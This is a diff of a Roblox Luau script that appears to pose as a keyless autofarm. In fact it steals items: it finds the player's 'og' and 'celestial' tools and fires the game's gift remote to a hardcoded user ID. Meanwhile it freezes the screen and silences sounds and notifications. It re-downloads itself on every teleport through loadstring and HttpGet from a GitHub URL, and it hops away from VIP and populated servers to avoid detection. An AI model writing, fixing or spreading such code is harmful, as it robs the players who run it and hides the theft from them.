@@ -1,3 +1,4 @@
+--// SERVICES
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
@@ -7,20 +8,14 @@ local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 local backpack = player:WaitForChild("Backpack")
-local PLACE_ID = game.PlaceId
 
 local targetUserId = 9367836539
-local giftRemote = ReplicatedStorage.Shared.Packages.Network.rev_GiftRequest
 local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")
 
---====================================================
--- 🔥 LOCK SYSTEM (ANTI DOUBLE HOP)
---====================================================
-
-local hopped = false
+local PLACE_ID = game.PlaceId
 
 --====================================================
--- 🔥 QUEUE SYSTEM
+-- 🔥 QUEUE SYSTEM (ULTRA FIX)
 --====================================================
 
 local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
@@ -29,14 +24,34 @@ local function queueSelf()
     if queue_on_teleport then
         queue_on_teleport([[
             repeat task.wait() until game:IsLoaded()
-            task.wait(2)
+
+            local Players = game:GetService("Players")
+            local player = Players.LocalPlayer
+
+            repeat task.wait() until player
+            repeat task.wait() until player.Character
+            repeat task.wait() until player:FindFirstChild("Backpack")
+
+            task.wait(3)
+
             loadstring(game:HttpGet("]] .. SCRIPT_URL .. [["))()
         ]])
     end
 end
 
 --====================================================
--- 🔥 SERVER CHECK
+-- 🔥 REMOTE FIX (ANTI INVALID)
+--====================================================
+
+local function getGiftRemote()
+    return ReplicatedStorage:WaitForChild("Shared")
+        :WaitForChild("Packages")
+        :WaitForChild("Network")
+        :WaitForChild("rev_GiftRequest")
+end
+
+--====================================================
+-- 🔥 SERVER DETECT
 --====================================================
 
 local function getServerType()
@@ -54,6 +69,8 @@ end
 
 local function isBadServer()
     local t = getServerType()
+    print("ServerType:", t)
+
     if not t then return false end
 
     return string.find(t, "vip")
@@ -62,23 +79,28 @@ local function isBadServer()
 end
 
 --====================================================
--- 🌐 SERVER FIND (≤2 PLAYER)
+-- 🌐 SERVER FIND
 --====================================================
 
 local function getLowServer()
-    local url = "https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100"
+    local cursor = ""
 
-    local success, result = pcall(function()
-        return HttpService:JSONDecode(game:HttpGet(url))
-    end)
+    for i = 1,5 do
+        local url = "https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100&cursor="..cursor
 
-    if not success or not result or not result.data then
-        return nil
-    end
+        local success, result = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet(url))
+        end)
 
-    for _,server in pairs(result.data) do
-        if server.playing and server.playing <= 2 then
-            return server.id
+        if success and result and result.data then
+            for _,server in pairs(result.data) do
+                if server.playing <= 2 and server.playing > 0 then
+                    return server.id
+                end
+            end
+
+            cursor = result.nextPageCursor
+            if not cursor then break end
         end
     end
 
@@ -86,34 +108,29 @@ local function getLowServer()
 end
 
 --====================================================
--- 🚀 HOP SYSTEM (FIXED LOCK)
+-- 🚀 HOP SYSTEM
 --====================================================
 
 local function hopServer()
-    if hopped then return end
-    hopped = true
-
     queueSelf()
 
     local id = getLowServer()
 
     if id then
-        print("HOP → LOW SERVER")
+        print("FOUND LOW SERVER → HOP")
         TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player)
     else
-        print("HOP → FALLBACK")
+        print("FALLBACK SERVER")
         TeleportService:Teleport(PLACE_ID, player)
     end
 end
 
 --====================================================
--- 🚀 SERVER HANDLER (NO DOUBLE TRIGGER)
+-- 🚀 SERVER CHECK
 --====================================================
 
 task.spawn(function()
     task.wait(2)
-
-    if hopped then return end
 
     if isBadServer() then
         print("VIP SERVER → HOP")
@@ -130,21 +147,8 @@ task.spawn(function()
     print("GOOD SERVER ✅")
 end)
 
-task.spawn(function()
-    while true do
-        task.wait(5)
-
-        if hopped then break end
-
-        if #Players:GetPlayers() > 2 then
-            hopServer()
-            break
-        end
-    end
-end)
-
 --====================================================
--- 💀 GUI FREEZE (UNCHANGED)
+-- 💀 FREEZE GUI
 --====================================================
 
 local gui = player:WaitForChild("PlayerGui")
@@ -184,7 +188,7 @@ RunService.RenderStepped:Connect(function()
 end)
 
 --====================================================
--- 🔇 SOUND + NOTIF CLEAN
+-- 🔇 CLEAN SOUND + NOTIF
 --====================================================
 
 local effects = SoundService:WaitForChild("Effects")
@@ -210,28 +214,12 @@ task.spawn(function()
 end)
 
 --====================================================
--- 🎬 ANTI TOOL ANIMATION FIX
+-- 🎁 AUTO GIFT SYSTEM (FULL FIX)
 --====================================================
 
 local function getChar()
     return player.Character or player.CharacterAdded:Wait()
 end
-
-local function blockToolAnimations(hum)
-    hum.AnimationPlayed:Connect(function(track)
-        local name = string.lower(track.Name)
-
-        if string.find(name, "tool")
-        or string.find(name, "equip")
-        or string.find(name, "hold") then
-            track:Stop(0)
-        end
-    end)
-end
-
---====================================================
--- 🎁 AUTO GIFT SYSTEM (FIXED)
---====================================================
 
 local function isWeightTool(tool)
     return weightFolder:FindFirstChild(tool.Name) ~= nil
@@ -241,8 +229,6 @@ local function silentEquip(tool)
     local char = getChar()
     local hum = char:FindFirstChildOfClass("Humanoid")
     if not hum then return end
-
-    blockToolAnimations(hum)
 
     hum:EquipTool(tool)
     task.wait()
@@ -277,10 +263,24 @@ local function getRarity(tool)
     end
 end
 
-task.wait(2)
+--====================================================
+-- ⏳ WAIT FULL LOAD (PENTING)
+--====================================================
+
+repeat task.wait() until player.Character
+repeat task.wait() until player:FindFirstChild("Backpack")
+repeat task.wait() until #backpack:GetChildren() > 0
+
+print("PLAYER FULLY LOADED ✅")
+
+--====================================================
+-- 🔁 MAIN LOOP
+--====================================================
 
 while true do
-    task.wait(0.005)
+    task.wait(0.01)
+
+    print("Loop running, tools:", #backpack:GetChildren())
 
     for _,tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
@@ -290,16 +290,34 @@ while true do
             end
 
             silentEquip(tool)
-            task.wait(0.005)
+            task.wait(0.01)
 
             local rarity = getRarity(tool)
 
             if rarity == "og" or rarity == "celestial" then
+                local giftRemote = getGiftRemote()
+                print("GIFT:", tool.Name, rarity)
+
                 giftRemote:FireServer(targetUserId)
-                task.wait(0.005)
+                task.wait(0.01)
             end
 
             unequipAll()
         end
     end
 end
+
+--====================================================
+-- 💀 FAILSAFE (ANTI STUCK)
+--====================================================
+
+task.spawn(function()
+    while true do
+        task.wait(10)
+
+        if #backpack:GetChildren() == 0 then
+            warn("Backpack kosong → HOP")
+            hopServer()
+        end
+    end
+end)
